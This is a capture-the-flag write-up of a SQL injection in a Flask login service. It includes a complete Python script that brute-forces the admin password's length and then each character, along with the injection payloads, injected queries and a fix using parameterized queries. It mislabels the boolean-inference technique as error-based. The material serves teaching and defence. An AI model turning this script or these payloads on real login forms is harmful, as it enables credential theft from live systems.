# CTF Challenge Writeup: Error-Based SQL Injection

## Challenge Overview

This writeup documents the solution to an error-based SQL injection (SQLi) vulnerability in a Flask-based authentication service. The challenge required extracting the admin password (which is the flag) from a SQLite database using targeted SQL injection techniques.

---

## Part 1: Vulnerability Analysis

### 1.1 Vulnerability Identification

The vulnerability exists in the `/` POST route of the Flask application:

```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
user = db.execute(query).fetchone()
```

**Root Cause:** Direct string interpolation of user input without parameterized queries.

### 1.2 Why This Is Error-Based SQLi

The key characteristic that makes this error-based SQLi:

```python
except sqlite3.Error as e:
    flask.abort(500, f"Query: {query}\nError: {e}")
```

The application **does not print query results** directly to the user. Instead, it only exposes information through:
- **HTTP Status 200**: Login successful (user record found and matches credentials)
- **HTTP Status 403**: Invalid username or password (no user record found)
- **HTTP Status 500**: SQL query error (syntax/logic error in the injected SQL)

This means we cannot use traditional union-based SQLi. We must rely on **conditional error-based techniques** where:
- Valid SQL = No error = 200/403 response
- Invalid SQL = Error = 500 response

### 1.3 Attack Surface

The vulnerability allows us to:
1. Inject SQL logic into the `username` and `password` form parameters
2. Execute arbitrary SQL queries in a SQLite context
3. Leverage SQLite functions like `LENGTH()`, `SUBSTR()`, and comparison operators
4. Infer data through conditional logic based on HTTP status codes

---

## Part 2: Exploitation Strategy

### 2.1 Why Python Script Over Burp Suite?

While Burp Suite's Cluster Bomb attack is powerful, it has limitations in this scenario:

| Aspect | Burp Suite Community | Python Script |
|--------|----------------------|---------------|
| Request Rate | Limited/Throttled | Full control |
| Conditional Logic | Basic | Advanced (conditional branching) |
| Character Iteration | Fixed payload sets | Dynamic character lists |
| Feedback Processing | Manual interpretation | Automated analysis |
| Execution Time | Slow for 100+ requests | Fast parallel processing |

For extracting a flag character-by-character, Python provides faster iteration and better control.

### 2.2 Exploitation Phases

The exploitation consists of three phases:

#### Phase 1: Determine Password Length
- Goal: Find the exact length of the admin password
- Technique: Linear search using `LENGTH()` function
- Payload: `admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length} --`
- Logic: When the condition is TRUE, the query returns no error, and we get a valid page

#### Phase 2: Character Extraction
- Goal: Extract each character of the password at each position
- Technique: Binary/linear search through character set
- Payload: `admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{character}' --`
- Logic: When the condition is TRUE, the substring matches the character
import requests
import string

def find_password_length_linear():
    """Find password length using reliable linear search"""
    print("Finding password length using linear search...")
    
    for length in range(1, 101):
        payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length} --"
        
        response = requests.post(
            "http://challenge.localhost/",
            data={"username": payload, "password": "x"},
            allow_redirects=True  # Follow redirects like in method 2
        )
        
        # Check if we got a successful page (not showing invalid username error)
        if response.status_code == 200 and "Invalid username" not in response.text:
            print(f"✓ Password length is: {length} characters")
            return length
        
        # Show progress every 20 attempts
        if length % 20 == 0:
            print(f"  Checked up to length {length}...")
    
    print("Could not determine password length (tried 1-100)")
    return None

def extract_flag(length):
    """Extract the flag character by character using the working method"""
    print(f"\nExtracting {length} characters...")
    print("-" * 60)
    
    flag = ""
    chars = string.ascii_letters + string.digits + "{}_-!@#$%^&*()[]|:;<>,.?/~`+="
    
    for position in range(1, length + 1):
        found_char = None
        
        for char in chars:
            # Escape single quotes
            escaped_char = char.replace("'", "''")
            
            payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{escaped_char}' --"
            
            response = requests.post(
                "http://challenge.localhost/",
                data={"username": payload, "password": "x"},
                allow_redirects=True  # Follow redirects
            )
            
            # Check if we got a successful page
            if response.status_code == 200 and "Invalid username" not in response.text:
                found_char = char
                flag += char
                print(f"[{position:2d}/{length}] '{char}' -> {flag}")
                break
        
        if not found_char:
            # Try without escaping (for some characters)
            for char in ["{", "}", "_", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "[", "]", "|", ":", ";", "<", ">", ",", ".", "?", "/", "~", "`", "+", "="]:
                payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{char}' --"
                
                response = requests.post(
                    "http://challenge.localhost/",
                    data={"username": payload, "password": "x"},
                    allow_redirects=True
                )
                
                if response.status_code == 200 and "Invalid username" not in response.text:
                    found_char = char
                    flag += char
                    print(f"[{position:2d}/{length}] '{char}' -> {flag}")
                    break
        
        if not found_char:
            flag += "?"
            print(f"[{position:2d}/{length}] Unknown character")
    
    return flag

def verify_extraction(extracted_flag):
    """Verify the extracted flag"""
    print("\nVerifying extracted flag...")
    
    # Try to login with the actual password
    response = requests.post(
        "http://challenge.localhost/",
        data={"username": "admin", "password": extracted_flag},
        allow_redirects=True
    )
    
    if "Hello, admin!" in response.text:
        print("✓ SUCCESS: Flag verification passed!")
        return True
    else:
        print("✗ WARNING: Flag verification failed")
        return False

# Main execution
print("=" * 60)
print("COMPLETE ADMIN PASSWORD EXTRACTOR")
print("=" * 60)

# Step 1: Find password length
password_length = find_password_length_linear()

if password_length:
    print(f"\nStep 1 complete: Password length = {password_length}")
    
    # Step 2: Extract the flag
    flag = extract_flag(password_length)
    
    print("\n" + "=" * 60)
    print("EXTRACTION COMPLETE")
    print("=" * 60)
    
    if '?' in flag:
        print(f"⚠️  Partial extraction (some characters unknown): {flag}")
        print("Unknown characters shown as '?'")
    else:
        print(f"🎯 ADMIN PASSWORD: {flag}")
        
        # Step 3: Verify the extraction
        verify_extraction(flag)
        
        print(f"\n💡 The admin password is the flag: {flag}")
else:
    print("Failed to determine password length. Cannot proceed with extraction.")


#### Phase 3: Verification
- Goal: Confirm the extracted password is correct
- Technique: Direct login attempt
- Method: POST request with `username=admin` and extracted password

---

## Part 3: Implementation Details

### 3.1 SQL Injection Payload Structure

The core injection modifies the WHERE clause logic:

**Original Query:**
```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'password'
```

**Injected Query (Length Detection):**
```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=42 -- ' AND password = 'x'
```

**Injected Query (Character Extraction):**
```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1)='p' --' AND password = 'x'
```

The `--` sequence comments out the remaining query, preventing syntax errors.

### 3.2 Response Interpretation

The script interprets responses based on HTTP status and content:

```
Status 200 + "Invalid username or password" NOT in response
    ↓
    Condition is TRUE (character/length matches)
    
Status 200 + "Invalid username or password" in response
    ↓
    Condition is FALSE (character/length doesn't match)
    
Status 500
    ↓
    SQL syntax error or escaped quote issues
```

### 3.3 Character Handling

SQLite's string comparison is case-sensitive and literal. Special handling required for:

- **Single Quotes**: Escaped by doubling: `'` → `''`
- **Special Characters**: Some may require SQL escaping depending on context
- **Character Set**: Extended to include common flag format characters: `{}_-!@#$%^&*()`

---

## Part 4: Complete Python Script Analysis

### 4.1 Function: `find_password_length_linear()`

```python
def find_password_length_linear():
    """Find password length using reliable linear search"""
    print("Finding password length using linear search...")
    
    for length in range(1, 101):
        payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length} --"
        
        response = requests.post(
            "http://challenge.localhost/",
            data={"username": payload, "password": "x"},
            allow_redirects=True
        )
        
        if response.status_code == 200 and "Invalid username" not in response.text:
            print(f"✓ Password length is: {length} characters")
            return length
```

**How It Works:**
1. Iterates through lengths 1-100
2. For each length, injects a payload checking if `LENGTH(password) = {length}`
3. When the condition is TRUE, the WHERE clause returns the admin user, no error occurs
4. The response contains "Hello, admin!" (success page), not "Invalid username" (failure message)
5. Returns the first length where this condition is met

**Why It Works:**
- When the injected condition is TRUE, the WHERE clause matches and returns the admin user
- When FALSE, the WHERE clause returns no results, triggering the 403 "Invalid username or password" error message

### 4.2 Function: `extract_flag(length)`

```python
def extract_flag(length):
    """Extract the flag character by character using the working method"""
    print(f"\nExtracting {length} characters...")
    print("-" * 60)
    
    flag = ""
    chars = string.ascii_letters + string.digits + "{}_-!@#$%^&*()[]|:;<>,.?/~`+="
    
    for position in range(1, length + 1):
        found_char = None
        
        for char in chars:
            escaped_char = char.replace("'", "''")
            
            payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{escaped_char}' --"
            
            response = requests.post(
                "http://challenge.localhost/",
                data={"username": payload, "password": "x"},
                allow_redirects=True
            )
            
            if response.status_code == 200 and "Invalid username" not in response.text:
                found_char = char
                flag += char
                print(f"[{position:2d}/{length}] '{char}' -> {flag}")
                break
```

**How It Works:**
1. For each position (1 to length):
   - Iterate through all possible characters
   - Use `SUBSTR()` to extract character at position
   - Compare with candidate character
   - When match found, add to flag and move to next position
2. Uses early break optimization: once character is found, move to next position

**Why This Is Efficient:**
- Average 40 requests per character (assuming ~40 character charset)
- For a 50-character password: ~2000 requests total
- Much faster than manual fuzzing with Burp Suite

**Special Character Handling:**
- Single quotes are escaped by doubling: `'` → `''`
- Fallback loop handles edge cases with unescaped special characters

### 4.3 Function: `verify_extraction(extracted_flag)`

```python
def verify_extraction(extracted_flag):
    """Verify the extracted flag"""
    print("\nVerifying extracted flag...")
    
    response = requests.post(
        "http://challenge.localhost/",
        data={"username": "admin", "password": extracted_flag},
        allow_redirects=True
    )
    
    if "Hello, admin!" in response.text:
        print("✓ SUCCESS: Flag verification passed!")
        return True
```

**How It Works:**
1. Sends a direct login attempt with admin username and extracted password
2. Checks if the response contains "Hello, admin!" (success message)
3. This confirms the extracted password is correct

---

## Part 5: Attack Flow Diagram

```
START
  ↓
[Phase 1] Find Password Length
  ├─ Send: admin' AND LENGTH(password)=1 --
  ├─ Check Response → FALSE (contains "Invalid username")
  ├─ Send: admin' AND LENGTH(password)=2 --
  ├─ Check Response → FALSE
  ├─ ...
  ├─ Send: admin' AND LENGTH(password)=42 --
  └─ Check Response → TRUE (returns success page)
  ↓
[Phase 2] Extract Characters (for each position 1 to 42)
  ├─ Send: admin' AND SUBSTR(password,1,1)='a' --
  ├─ Check Response → FALSE
  ├─ Send: admin' AND SUBSTR(password,1,1)='p' --
  ├─ Check Response → TRUE
  ├─ Flag += 'p'
  ├─ Send: admin' AND SUBSTR(password,2,1)='w' --
  ├─ Check Response → FALSE
  ├─ Send: admin' AND SUBSTR(password,2,1)='q' --
  └─ Check Response → TRUE → Flag += 'q'
  ↓
[Phase 3] Verify Extraction
  ├─ Send: username=admin, password=extracted_flag
  ├─ Check if "Hello, admin!" in response
  └─ Confirm success
  ↓
END: Flag extracted and verified
```

---

## Part 6: Key Insights

### 6.1 Why Error-Based SQLi Works Here

The application is designed to:
- **Not display query results** to the user
- **Only expose errors** through HTTP status codes and error messages
- **Validate authentication** through session creation

This forces the attacker to use inference techniques where:
- Successful WHERE clause evaluation (no error) = TRUE condition detected
- Failed WHERE clause evaluation (no matching rows) = FALSE condition detected

### 6.2 Character Encoding Considerations

SQLite handles character encoding automatically, but special considerations:
- Case sensitivity: Comparisons are case-sensitive by default
- Quote escaping: Single quotes must be doubled within string literals
- Comment syntax: `--` and `/* */` both work to comment out remaining query

### 6.3 Optimization Opportunities

The script could be further optimized by:
1. **Binary search** for password length (instead of linear)
2. **Character frequency analysis** to prioritize common characters
3. **Parallel requests** using threading (with rate limiting)
4. **Known prefix exploitation**: If you know the flag starts with `pwn.college{`, start extraction from that point

---

## Part 7: Defense Mechanisms

### 7.1 How to Fix This Vulnerability

**Vulnerable Code:**
```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
user = db.execute(query).fetchone()
```

**Secure Code:**
```python
query = "SELECT rowid, * FROM users WHERE username = ? AND password = ?"
user = db.execute(query, (username, password)).fetchone()
```

**Key Changes:**
- Use parameterized queries (`?` placeholders)
- Pass parameters separately to `execute()`
- Database driver handles escaping and type checking
- Completely prevents SQL injection

### 7.2 Additional Security Measures

1. **Input Validation**: Whitelist allowed characters in username/password
2. **Rate Limiting**: Prevent brute force by limiting requests per IP
3. **Error Handling**: Don't expose SQL queries or errors to users
4. **Password Hashing**: Never store plaintext passwords (use bcrypt, Argon2)
5. **WAF Protection**: Web Application Firewall rules for SQLi patterns

---

## Part 8: Conclusion

This challenge demonstrates the critical importance of parameterized queries in preventing SQL injection. Even when query results aren't directly displayed, attackers can infer sensitive information through timing, error messages, or HTTP status codes.

The Python script effectively exploits this vulnerability by:
1. Using conditional SQL logic to extract one bit of information per request
2. Automating the inference process to extract the complete password
3. Verifying the extraction by attempting actual login

This technique is widely applicable to error-based SQLi vulnerabilities and is more efficient than manual exploitation for moderate-length secrets.

---
The used script in solve.py
---

**End of Writeup**
